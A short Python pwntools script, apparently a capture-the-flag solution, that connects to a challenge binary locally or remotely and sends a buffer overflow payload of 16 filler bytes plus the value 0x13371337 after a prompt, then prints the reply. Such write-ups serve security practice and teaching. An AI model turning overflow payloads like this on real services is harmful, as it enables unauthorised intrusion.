from pwn import *
from config import REMOTE_ADDR, REMOTE_PORT

REMOTE = 1  # Change to 1 to run the exploit on the remote instance

e = context.binary = ELF("./chal")

if REMOTE:
    p = remote(REMOTE_ADDR, REMOTE_PORT)
else:
    p = e.process()


p.sendlineafter(b">", b"A" * 0x10 + p32(0x13371337))
res = p.recvline()
print(res)
